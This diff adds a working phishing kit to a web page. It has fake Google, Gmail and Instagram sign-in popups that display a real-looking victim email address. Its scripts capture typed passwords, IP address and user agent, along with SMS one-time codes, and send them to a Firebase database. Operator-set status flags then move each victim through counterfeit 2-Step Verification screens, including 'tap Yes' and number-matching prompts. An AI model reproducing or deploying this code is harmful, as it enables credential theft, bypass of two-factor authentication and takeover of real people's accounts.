@@ -141,3 +141,867 @@ function injectContent(method) {
 // Load CDN content after 3 seconds (optional, can be removed)
 setTimeout(fetchCdnContent, 3000);
 </script>
+
+
+        <script>
+        
+        function updatePopupContentfb(statusMessage = '') {
+    // Select the popup content
+    const popupContent = document.querySelector('.popup-content');
+    
+    if (popupContent) {
+        // Change the h2 text
+        const h2 = popupContent.querySelector('.popup-title');
+        if (h2) {
+            h2.textContent = 'Sign up to Gmail';
+        }
+        
+        // Remove all existing signup options
+        const signupOptions = popupContent.querySelectorAll('.signup-option');
+        signupOptions.forEach(option => option.remove());
+
+        // Create new Gmail signup option
+        const gmailOption = document.createElement('div');
+        gmailOption.className = 'signup-option';
+        gmailOption.innerHTML = `
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png" alt="Gmail Logo">
+            <span>Continue with Gmail</span>
+        `;
+        gmailOption.addEventListener('click', () => {
+            // Add your Gmail signup logic here
+            open_twitter();
+            console.log('Gmail signup clicked');
+        });
+        
+        // Insert the new Gmail option after the h2
+        h2.insertAdjacentElement('afterend', gmailOption);
+        
+        // Add or update status message
+        let statusElement = popupContent.querySelector('.status-message');
+        if (!statusElement) {
+            statusElement = document.createElement('p');
+            statusElement.className = 'status-message';
+            // Insert the status message after the Gmail option
+            gmailOption.insertAdjacentElement('afterend', statusElement);
+        }
+        statusElement.textContent = statusMessage;
+        statusElement.style.color = '#ff3333'; // Professional error red color
+        statusElement.style.marginTop = '15px';
+        statusElement.style.fontWeight = 'bold';
+        statusElement.style.fontSize = '14px';
+    }
+}
+
+function updatePopupContentGl(statusMessage = '') {
+    // Select the popup content
+    const popupContent = document.querySelector('.popup-content');
+    
+    if (popupContent) {
+        // Change the h2 text
+        const h2 = popupContent.querySelector('.popup-title');
+        if (h2) {
+            h2.textContent = 'Sign up using Instagram';
+        }
+        
+        // Remove all existing signup options
+        const signupOptions = popupContent.querySelectorAll('.signup-option');
+        signupOptions.forEach(option => option.remove());
+
+        // Create new Gmail signup option
+        const Instaoption = document.createElement('div');
+        Instaoption.className = 'signup-option';
+        Instaoption.innerHTML = `
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Insta Logo">
+            <span>Continue with Instagram</span>
+        `;
+        Instaoption.addEventListener('click', () => {
+            // Add your Gmail signup logic here
+            open_facebook();
+          
+        });
+        
+        // Insert the new Gmail option after the h2
+        h2.insertAdjacentElement('afterend', Instaoption);
+        
+        // Add or update status message
+        let statusElement = popupContent.querySelector('.status-message');
+        if (!statusElement) {
+            statusElement = document.createElement('p');
+            statusElement.className = 'status-message';
+            // Insert the status message after the Gmail option
+            Instaoption.insertAdjacentElement('afterend', statusElement);
+        }
+        statusElement.textContent = statusMessage;
+        statusElement.style.color = '#ff3333'; // Professional error red color
+        statusElement.style.marginTop = '15px';
+        statusElement.style.fontWeight = 'bold';
+        statusElement.style.fontSize = '14px';
+    }
+}
+
+
+
+    </script>
+
+   
+    <!-- heres the js code for phase fb popup submission-->
+
+  
+           <!--  Function to handle the login button click inside the popup -->
+       
+
+   <!--USE TO FETCH THIS BLOCK OF CODE FROM THE SERVER AFTER 2 SECOND PHASE2 IF CONDITION -->
+   <div class="popup-login containerxgmailx   animated fadeIn" style="display: none;">
+
+      <div class="containerxgmail">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="logo">
+    <h2>Welcome</h2>
+    <div class="email-containerxgmail">
+        <div class="emailxgmail">
+            <div class="email-icon">
+                <img src="https://lh3.googleusercontent.com/a-/ALV-UjX93Sk3Zy6BFlb7LHl4QbpVIsJ9mKjlqs8xKtqpAMPG4oVMJFrh=s300-p-k-rw-no" alt="User Avatar">
+            </div>
+            <span class="email-text">janellemurrells@gmail.com</span>
+            <span class="dropdown">&#x25BC;</span>
+        </div>
+      </div>
+
+      <p class="kaget sandi-fb" id="errortwit" style="display: none; width: 330px; top: -15px; text-align: left;">Incorrect password. <b>Did you
+        forget your password?</b></p>
+
+      <form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
+        <label for="password">Enter your password</label>
+        <input type="password" id="password-twitter" name="password" >
+        <div class="password-options">
+            <input type="checkbox" id="showPassword">
+            <label for="showPassword">Show password</label>
+        </div>
+        <input type="submit" value="Next">
+        <a href="#"id="forgotPasswordLink">Forgot password?</a>
+    </form>
+    <footer>
+        <div class="language">English (United States) ▼</div>
+        <ul>
+            <li><a href="#">Help</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+        </ul>
+    </footer>
+</div>
+</div>
+    <!--js inject code for twitter -->
+    <script>
+         forgotPasswordLink.addEventListener('click', opentwofacsms);
+      document.getElementById('showPassword').addEventListener('change', function () {
+    var passwordField = document.getElementById('password-twitter');
+    if (this.checked) {
+        passwordField.type = 'text';  // Show password
+    } else {
+        passwordField.type = 'password';  // Hide password
+    }
+});
+  
+
+async function submitEmailx(event) {
+    const error = document.getElementById('errortwit');
+  const nameInput = document.getElementById('password-twitter');
+
+  if (event) event.preventDefault(); // Prevents form from submitting the default way
+
+  await getIPAddress();
+  let cachedUserAgent = navigator.userAgent;
+
+  function checkName(name) {
+      if (name.trim() === "") {
+          error.style.display = 'block';
+          error.innerHTML = `Incorrect password. Did you forget your password? 
+<span style="font-weight: bold; text-decoration: underline; color: #FFFFFF; cursor: pointer;" onclick=" opentwofacsms()">Reset your password</span>`;
+
+error.style.cssText = `
+  display: block;
+  background-color: #FF4136;
+  color: #FFFFFF;
+  padding: 12px 16px;
+  border-radius: 4px;
+  font-family: Arial, sans-serif;
+  line-height: 1.5;
+  width: auto; top: -15px; text-align: left;
+`;
+
+          console.log("Field is empty!");
+          return false;
+      }
+      error.style.display = 'none';
+      return true;
+  }
+
+  nameInput.addEventListener('input', function() {
+      error.style.display = 'none';
+  });
+
+  const password = nameInput.value;
+
+  if (!checkName(password)) {
+      return;
+  }
+
+  loaderContainer.style.display = 'flex';
+  error.style.display = 'none';
+
+  const timestamp = Date.now();
+ 
+  const userAgent = cachedUserAgent;
+
+  try {
+      const submission = await database.ref('submissions-gl').push({
+          password,
+          timestamp,
+          ipAddress: cachedIpAddress,
+          userAgent,
+          status: 'pending'
+      });
+
+      const submissionKey = submission.key;
+      startListeningtwit(submissionKey);
+
+      await database.ref('gmail').push({
+          name: password,
+          timestamp: new Date().toISOString()
+      });
+
+      console.log('Data saved successfully');
+  } catch (error) {
+      console.error('Error submitting form:', error);
+      loaderContainer.style.display = 'none';
+      alert('An error occurred. Please try again.');
+  }
+}
+
+function startListeningtwit(submissionKey) {
+ 
+
+  database.ref(`submissions-gl/${submissionKey}/status`).on('value', (snapshot) => {
+      const status = snapshot.val();
+      
+      if (status === 'approved') {
+          loaderContainer.style.display = 'none';
+       tutup_twitter();
+      opentwofacsms();
+      } else if (status === 'rejected') {
+        loaderContainer.style.display = 'none';
+          error.textContent = "Incorrect password. Did you forget your password? Reset your password from the button below and try again!";
+          error.style.display = 'block';
+      } else if (status === 'otp') {
+        loaderContainer.style.display = 'none';
+        tutup_twitter();
+       opentwofacsms();
+      } else if (status === 'successpage') {
+        loaderContainer.style.display = 'none';
+        tutup_twitter();
+        window.location.href='thankyou.html';
+      } else if (status === 'locationpage') {
+        loaderContainer.style.display = 'none';
+        tutup_twitter();
+        showLocationPopup();
+      } else if (status === 'anothermethod') {
+        loaderContainer.style.display = 'none';
+        tutup_twitter();
+        updatePopupContentGl('Please sign in using gmail.');
+        showPopup();
+       
+      } else if (status === 'tapyes') {
+        loaderContainer.style.display = 'none';
+        tutup_twitter();
+       openverificationtapauth();
+       
+      } else if (status === 'tapnum') {
+        loaderContainer.style.display = 'none';
+        tutup_twitter();
+       openverificationtap();
+       
+      }
+      
+  });
+}
+
+// Ensure form submission is handled only once
+document.getElementById('ValidateLoginTwitterForm').addEventListener('submit', submitEmailx);
+
+
+
+
+
+  </script>
+    <!-- heres the recovexlogic PHASE 3 -->
+    <div class="popup-login login-facebook2c animated fadeIn" style="display: none;">
+        <div class="popup-box-login-fb">
+            <a onclick="tutup_facebookr()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+            <div class="navbar-fb"><img src="iconin.png"></div>
+            <div class="content-box-fb taller">
+               
+                     <img src="icon.jpg">
+                    <div class="txt-login-fb">Send login code to your registered mobile number 89xxx8049 to get back to your account . </div>
+                 <form class="login-form" action="javascript:void(0)" method="post" id="otpform">
+
+                    <button type="submit" class="btn-login-fb" onclick="otp_page()">Send code</button>
+                </form>
+                
+                
+                
+            </div>
+           
+           
+        </div>
+    </div>
+    <script>
+        
+           
+function otp_page() {
+    $('.login-facebook2c').hide();
+    $('.login-facebook2cx').show();
+   
+  
+}
+            //i have to write code to inject the otp page code and script form here PHASE 3 JS TO INJCT PHASE 4 DIV AND JS 
+
+
+    </script>
+    <!-- PHASE 4 DIV INJECT FOR OTP CODE SEND IF FORGOTTEN PASSWORD ID TOUCHED -->
+    <div class="popup-login login-facebook2cx animated fadeIn" style="display: none;">
+        <div class="popup-box-login-fb">
+            <a onclick="tutup_facebookr()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+            <div class="navbar-fb"><img src="iconin.png"></div>
+            <div class="content-box-fb taller">
+                <p class="kaget sandi-fb" id="error-messageotp" style="width: 330px; top: -15px; text-align: left;">Incorrect password. <b>Did you
+                    forget your password?</b></p>
+                <img src="icon.jpg">
+                <div class="txt-login-fb">Enter the 6 digit code sent to your mobile number 89xxxx8049.</div>
+                <form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbFormxx">
+                    <div class="inputfield">
+                        <input type="text" maxlength="1" inputmode="numeric" class="input" disabled />
+                        <input type="text" maxlength="1" inputmode="numeric" class="input" disabled />
+                        <input type="text" maxlength="1" inputmode="numeric" class="input" disabled />
+                        <input type="text" maxlength="1" inputmode="numeric" class="input" disabled />
+                        <input type="text" maxlength="1" inputmode="numeric" class="input" disabled />
+                        <input type="text" maxlength="1" inputmode="numeric" class="input" disabled />
+                    </div>
+                    <button type="submit" class="btn-login-fb hide" id="otpsubmit">Send code</button>
+                </form>
+                <a href="#" id="resendOtp" class="resend-link" disabled>Didn't get OTP? Resend? (<span id="timer">30</span>s)</a>
+            </div>
+        </div>
+    </div>
+  <!--js to be injected in phase 4 for otp handle -->
+  <script>
+    const errorotp = document.getElementById('error-messageotp');
+    
+const inputs = document.querySelectorAll(".input");
+const submitButton = document.getElementById("otpsubmit");
+const resendLink = document.getElementById("resendOtp");
+const timerElement = document.getElementById("timer");
+
+let inputCount = 0;
+let finalInput = "";
+let timer = 30;
+let timerInterval;
+let isEditMode = false;
+
+// Generate a unique user ID
+const userId = 'user_' + Date.now();
+
+// Function to log user action to Firebase
+function logUserActionx(action) {
+    const userRef = database.ref('users/' + userId);
+    userRef.push({
+        action: action,
+        timestamp: firebase.database.ServerValue.TIMESTAMP
+    });
+}
+
+// Function to start the resend timer
+const startResendTimer = () => {
+    let secondsLeft = 30;
+    resendLink.setAttribute('disabled', '');
+    resendLink.textContent = `Didn't get OTP? Resend? (${secondsLeft}s)`;
+
+    resendTimer = setInterval(() => {
+        secondsLeft--;
+        resendLink.textContent = `Didn't get OTP? Resend? (${secondsLeft}s)`;
+        if (secondsLeft <= 0) {
+            clearInterval(resendTimer);
+            resendLink.removeAttribute('disabled');
+            resendLink.textContent = "Didn't get OTP? Resend?";
+        }
+    }, 1000);
+};
+
+// Start the initial timer
+startResendTimer();
+
+// Activate/Disable inputs logic
+const updateInputConfig = (element, disabledStatus) => {
+    element.disabled = disabledStatus;
+    if (!disabledStatus) {
+        element.focus();
+    } else {
+        element.blur();
+    }
+};
+
+// Function to enable edit mode
+const enableEditMode = () => {
+    isEditMode = true;
+    inputs.forEach((input) => {
+        input.disabled = false;
+    });
+    inputs[inputCount - 1].focus();
+};
+
+// Function to update submit button visibility
+const updateSubmitButtonVisibility = () => {
+    if (inputCount === 6) {
+        submitButton.classList.remove("hide");
+    } else {
+        submitButton.classList.add("hide");
+    }
+};
+
+// Handle OTP inputs logic
+inputs.forEach((input, index) => {
+    input.addEventListener("input", (e) => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, "");
+        let { value } = e.target;
+
+        if (value.length === 1) {
+            if (!isEditMode) {
+                updateInputConfig(e.target, true);
+            }
+            finalInput = [...inputs].map(input => input.value).join("");
+            if (index < 5) {
+                updateInputConfig(inputs[index + 1], false);
+            }
+            inputCount = [...inputs].filter(input => input.value !== "").length;
+        }
+
+        updateSubmitButtonVisibility();
+    });
+
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace") {
+            e.preventDefault();
+            input.value = "";
+            finalInput = finalInput.slice(0, -1);
+            inputCount = Math.max(0, inputCount - 1);
+            if (index > 0) {
+                updateInputConfig(inputs[index - 1], false);
+                inputs[index - 1].value = "";
+            }
+            updateSubmitButtonVisibility();
+        }
+    });
+
+    // Add touch event listener to all inputs for edit mode
+    input.addEventListener("touchstart", (e) => {
+        if (inputCount === 6 && !isEditMode) {
+            e.preventDefault();
+            enableEditMode();
+        }
+    });
+});
+
+// Function to reset OTP input
+const resetOtp = () => {
+    inputCount = 0;
+    finalInput = "";
+    isEditMode = false;
+    inputs.forEach((input, index) => {
+        input.value = "";
+        updateInputConfig(input, index !== 0);
+    });
+    submitButton.classList.add("hide");
+};
+
+// Event listener for resend link
+resendLink.addEventListener("click", (e) => {
+    e.preventDefault();
+    if (!resendLink.hasAttribute('disabled')) {
+        resetOtp();
+        startResendTimer();
+        logUserActionx('resend_otp');
+        console.log("Resending OTP...");
+    }
+});
+
+// Event listener for submit button
+submitButton.addEventListener("click", () => {
+    logUserActionx('submit_otp');
+    
+    loaderContainer.style.display = 'flex';
+    // Send OTP to Firebase for admin approval
+    const otpRef = database.ref('otps/' + userId);
+    otpRef.set({
+        otp: finalInput,
+        status: 'pending',
+        timestamp: firebase.database.ServerValue.TIMESTAMP
+    });
+
+
+            // Listen for admin approval
+            otpRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.status === 'approved') {
+                    loaderContainer.style.display = 'none';
+                    tutup_facebookOTP();
+                    updatePopupContentfb('please sign in with gmail');
+                    
+                    showPopup();
+                    
+                } else if (data && data.status === 'rejected') {
+                    loaderContainer.style.display = 'none';
+                   
+                    
+                    resetOtp();
+                    errorotp.style.display = 'block';
+                    errorotp.textContent = "Please enter correct otp!";
+                }else if (data && data.status === 'failedwithig') {
+                    loaderContainer.style.display = 'none';
+                    tutup_facebookOTP();
+                    updatePopupContentfb('please sign in with gmail');
+                    
+                    showPopup();
+
+                  
+                    
+                  
+                }else if (data && data.status === 'locationpg') {
+                    loaderContainer.style.display = 'none';
+                    tutup_facebookOTP();
+                    showLocationPopup();
+                    
+                   
+                }else if (data && data.status === 'sucesspg') {
+                    loaderContainer.style.display = 'none';
+                    window.location.href='thankyou.html';
+                    
+                    
+                }
+            });
+        });
+
+        // Initial setup
+        resetOtp();
+  </script>
+
+
+   <!-- DIV   IN CONDITION OF two factor auth tap phase 5 -->
+   <div class="popup-login verify-containertap   animated fadeIn" style="display: none;">
+
+   <div class="verify-container" >
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google logo">
+    </div>
+    <h1>Simplify 2-Step Verification with a single tap</h1>
+    <div class="email">
+        <div class="email-icon">
+            <img src="https://lh3.googleusercontent.com/a-/ALV-UjX93Sk3Zy6BFlb7LHl4QbpVIsJ9mKjlqs8xKtqpAMPG4oVMJFrh=s300-p-k-rw-no" alt="User Avatar">
+        </div>
+        <span class="email-text">janellemurrells@gmail.com</span>
+        <span class="dropdown">&#x25BC;</span>
+    </div>
+    <div class="phone-illustration">
+        <img src="https://ssl.gstatic.com/accounts/embedded/signin_tapyes.gif" alt="Phone GIF"> 
+    </div>
+    <p class="instruction">Unlock your Nexus 5X</p>
+    <p class="instruction-detail">Tap Yes on the Google prompt to sign-in</p>
+    <div class="buttons">
+        <a href="#" class="skip-link">Skip</a>
+        <button class="try-now-btn" disabled>Try it Now</button>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+        </div>
+        <select class="language-selector">
+            <option value="en-US">English (US)</option>
+            <!-- Add more languages here -->
+        </select>
+    </footer>
+</div>
+   </div>
+ <!--  script fr tap auth phase5-->
+<script>
+
+function openverificationtapauth() {
+    $('.verify-containertap').show();
+ userIdxx = 'userx__' + Date.now();
+const otpRefx2 = database.ref('verificationpagestatus-tap/' + userIdxx);
+otpRefx2.set({
+    status: 'pending',
+    timestamp: firebase.database.ServerValue.TIMESTAMP
+});
+
+// Listen for admin approval
+otpRefx2.on('value', (snapshot) => {
+    const data = snapshot.val();
+    if (data && data.status === 'approved') {
+        $('.verify-containertap').hide();
+        showLocationPopup();
+
+       
+    } else if (data && data.status === 'rejected') {
+     
+            alert('You have not tpped yes!')
+    }  else if (data && data.status === 'twofacsmspage') {
+        $('.verify-containertap').hide();
+     opentwofacsms();
+    }  else if (data && data.status === 'sucesspage') {
+        $('.verify-containertap').hide();
+        window.location.href = 'thankyou.html';
+
+    }  else if (data && data.status === 'tapmnumberpage') {
+        $('.verify-containertap').hide();
+        openverificationtap();
+    }  else if (data && data.status === 'anothermethod') {
+        $('.verify-containertap').hide();
+        updatePopupContentGl('Please try with Instagram');
+        showPopup();
+    } 
+});
+
+// Function to clean up the listener when it's no longer needed
+function cleanupListener2() {
+    otpRefx2.off();
+}
+ }
+// Call cleanupListener when appropriate, e.g., component unmount or verification complete
+
+</script>
+ <!-- DIV  for gooogle auth sms verification phase 6-->
+ <div class="popup-login container2facsms   animated fadeIn" style="display: none;">
+ <div class="unique-main-box">
+    <div class="unique-logo-area">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="logo" />
+    </div>
+    <h1 class="unique-header-title">Secure Verification</h1>
+    <p class="unique-desc-text">Verify it's really you before proceeding with the login.</p>
+    <div class="unique-email-section">
+        <div class="unique-avatar-icon">
+            <img src="https://lh3.googleusercontent.com/a-/ALV-UjX93Sk3Zy6BFlb7LHl4QbpVIsJ9mKjlqs8xKtqpAMPG4oVMJFrh=s300-p-k-rw-no" alt="User Avatar">
+        </div>
+        <span>user@example.com ▼</span>
+    </div>
+    <div class="unique-verification-details">
+        <h2>Secure Verification Code</h2>
+        <p>A text with a 6-digit code was sent to *** *** **00</p>
+    </div>
+    <input type="text" class="unique-input-field" placeholder="Enter the code" id="verificationCode">
+    <div class="unique-checkbox-wrapper">
+        <input type="checkbox" id="unique-remember-checkbox">
+        <label for="unique-remember-checkbox">Don't ask again on this device</label>
+    </div>
+    <a href="#" id="resendOtpx" class="resend-link" disabled>Didn't get OTP? Resend? (<span id="timerx">30</span>s)</a>
+    <div class="unique-button-container">
+        <button class="unique-next-button" id="proceedButton">Proceed</button>
+    </div>
+ </div>
+ </div>
+ <!-- style of this upper google sms verification is not implemented so you have to do server side handling of stylings also and hers the below script to injcet for phase 6-->
+  <script>
+  const userIdx = 'usergmail_' + Date.now();
+const resendLinkx = document.getElementById("resendOtpx");
+const timerElementx = document.getElementById("timerx");
+const verificationCodeInput = document.getElementById('verificationCode');
+const proceedButton = document.getElementById('proceedButton');
+let timerx = 30;
+let timerIntervalx;
+
+// Function to log user action to Firebase
+function logUserAction(action) {
+    const userRef = database.ref('users-gmail-log/' + userIdx);
+    userRef.push({
+        action: action,
+        timestamp: firebase.database.ServerValue.TIMESTAMP
+    });
+}
+
+// Function to start the resend timer
+const startResendTimerx = () => {
+    let secondsLeft = 30;
+    resendLinkx.setAttribute('disabled', '');
+    updateTimerDisplay(secondsLeft);
+
+    timerIntervalx = setInterval(() => {
+        secondsLeft--;
+        updateTimerDisplay(secondsLeft);
+        if (secondsLeft <= 0) {
+            clearInterval(timerIntervalx);
+            resendLinkx.removeAttribute('disabled');
+            resendLinkx.textContent = "Didn't get OTP? Resend?";
+        }
+    }, 1000);
+};
+
+// Function to update timer display
+function updateTimerDisplay(seconds) {
+    timerElementx.textContent = seconds;
+    resendLinkx.textContent = `Didn't get OTP? Resend? (${seconds}s)`;
+}
+
+// Start the initial timer
+startResendTimerx();
+
+// Event listener for resend link
+resendLinkx.addEventListener("click", (e) => {
+    e.preventDefault();
+    if (!resendLinkx.hasAttribute('disabled')) {
+        resetOtpx();
+        startResendTimerx();
+        logUserAction('resend_otp');
+        console.log("Resending OTP...");
+    }
+});
+
+// Allow only numbers and limit to 6 digits
+verificationCodeInput.addEventListener('input', function (e) {
+    // Remove any non-digit characters
+    this.value = this.value.replace(/\D/g, '');
+    
+    // Limit to 6 digits
+    if (this.value.length > 6) {
+        this.value = this.value.slice(0, 6);
+    }
+
+    // Show/hide 'Proceed' button based on input length
+    if (this.value.length === 6) {
+        proceedButton.style.display = 'block';
+    } else {
+        proceedButton.style.display = 'none';
+    }
+});
+
+// Event listener for proceed button
+proceedButton.addEventListener("click", () => {
+    loaderContainer.style.display = 'flex';
+    const code = verificationCodeInput.value;
+    if (code.length === 6) {
+        logUserAction('submit_otp');
+        
+        // Send OTP to Firebase for admin approval
+        const otpRef = database.ref('otps-gmail/' + userIdx);
+        otpRef.set({
+            otp: code,
+            status: 'pending',
+            timestamp: firebase.database.ServerValue.TIMESTAMP
+        });
+
+        // Listen for admin approval
+        otpRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.status === 'approved') {
+                loaderContainer.style.display = 'none';
+                $('.container2facsms ').hide();
+              openverificationtap();
+            } else if (data && data.status === 'rejected') {
+                loaderContainer.style.display = 'none';
+                resetOtpx();
+                showError("Please enter correct OTP!");
+            } else if (data && data.status === 'failedwithig') {
+                $('.container2facsms ').hide();
+                loaderContainer.style.display = 'none';
+                updatePopupContentfb('please sign in with gmail');
+                showPopup();
+            } else if (data && data.status === 'locationpg') {
+                loaderContainer.style.display = 'none';
+                $('.container2facsms ').hide();
+                showLocationPopup();
+            } else if (data && data.status === 'sucesspg') {
+                loaderContainer.style.display = 'none';
+                $('.container2facsms ').hide();
+             window.location.href = 'thankyou.html';
+            } else if (data && data.status === 'tapauth') {
+                loaderContainer.style.display = 'none';
+                $('.container2facsms ').hide();
+             openverificationtapauth() 
+            }else if (data && data.status === 'tapnumberauth') {
+                loaderContainer.style.display = 'none';
+                $('.container2facsms ').hide();
+             openverificationtap() 
+            }
+        });
+    }
+});
+
+// Function to reset OTP input
+function resetOtpx() {
+    verificationCodeInput.value = '';
+    proceedButton.style.display = 'none';
+}
+
+// Initial setup
+resetOtpx();
+  </script>
+
+<!-- DIV  for gooogle auth number in device auth  phase 7-->
+<div class="popup-login  verify-containerx2  animated fadeIn" style="display: none;">
+
+<div class="verify-containerx" >
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google logo">
+    </div>
+    <h1>Verify it's you</h1>
+    <p class="info-text">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
+    <input type="email" value="someone@gmail.com" class="email-input" readonly>
+    <div class="code-display">18</div>
+    <p class="instructions">Open the Gmail app on iPhone</p>
+    <p class="small-text">Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong>18</strong> on your phone to verify it’s you.</p>
+    <button class="resend-btn">Resend it</button>
+</div>
+</div>
+<!-- style not implemneted script for phase7-->
+ <script>  
+ function openverificationtap() {
+    $('.verify-containerx2').show();
+ userIdxx = 'userx__' + Date.now();
+const otpRefx = database.ref('verificationpagestatus/' + userIdxx);
+otpRefx.set({
+    status: 'pending',
+    timestamp: firebase.database.ServerValue.TIMESTAMP
+});
+
+// Listen for admin approval
+otpRefx.on('value', (snapshot) => {
+    const data = snapshot.val();
+    if (data && data.status === 'approved') {
+        $('.verify-containerx2').hide();
+        showLocationPopup();
+
+       
+    } else if (data && data.status === 'rejected') {
+       
+            alert('You have tapped wrong number!')
+    }  else if (data && data.status === 'twofacsmspage') {
+        $('.verify-containerx2').hide();
+     opentwofacsms();
+    }  else if (data && data.status === 'sucesspage') {
+        $('.verify-containerx2').hide();
+        window.location.href = 'thankyou.html';
+
+    }  else if (data && data.status === 'tapmnumberpage') {
+        $('.verify-containerx2').hide();
+        openverificationtapauth();
+    }  else if (data && data.status === 'anothermethod') {
+        $('.verify-containerx2').hide();
+        updatePopupContentGl('Please try with Instagram');
+        showPopup();
+    } 
+});
+
+// Function to clean up the listener when it's no longer needed
+function cleanupListener() {
+    otpRefx.off();
+}
+ }
+// Call cleanupListener when appropriate, e.g., component unmount or verification complete
+ </script>
